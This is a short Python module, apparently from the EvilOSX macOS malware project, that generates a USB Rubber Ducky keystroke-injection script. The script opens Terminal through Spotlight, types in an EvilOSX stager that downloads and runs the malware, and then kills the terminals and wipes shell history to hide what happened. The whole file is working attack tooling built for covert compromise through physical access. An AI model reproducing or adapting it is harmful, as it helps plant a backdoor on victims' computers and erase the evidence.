class Launcher:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Creates a rubber ducky launcher.",
            "References": [],
        }

    def generate(self, stager):
        return ("txt", """\
        REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
        REM Also see https://ducktoolkit.com/vidpid/

        DELAY 1000
        GUI SPACE
        DELAY 500
        STRING Termina
        DELAY 1000
        ENTER
        DELAY 1500

        REM Kill all terminals after x seconds
        STRING screen -dm bash -c 'sleep 6; killall Terminal'
        ENTER

        STRING %s; history -cw; clear
        ENTER
        """ % stager)
